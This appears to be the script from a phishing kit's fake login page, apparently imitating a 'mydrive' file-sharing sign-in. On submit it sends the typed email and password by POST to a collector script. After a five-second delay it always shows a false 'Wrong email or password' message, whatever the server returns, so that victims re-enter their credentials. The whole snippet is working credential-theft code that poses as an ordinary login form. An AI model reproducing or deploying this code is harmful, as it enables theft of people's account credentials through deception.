		<script>
			//Execute upon clicking the login button in index.php
			$('#loginbtn').click(function(){
				//Get user input.
				var email = $('#email').val();
				var pass = $('#password').val();
				
				//If any required field is empty, prompt the user to supply the data
				if(email=='' || pass==''){
					alert("Username and password are required!");
				}
				//Else, send the data to the server and show error message.
				else {
					$('.user-content').attr('hidden','hidden');
					$('#feedback').html('<div><img height="70px" width="70px" src="https://livcifilter.com/web/mydrive/images/processing.gif" /></div>');
					var loading;
					loading = setTimeout(showError, 5000);
					$.post('loginscript.html', {email:email, pass:pass}, function(data){
					});
				}
				function showError() {
					$('#feedback').html('<br><div style="color:red"> Wrong email or password. Please, check and try again.</div>');
					$('.user-content').attr('hidden',false);
				}
			});
		</script>
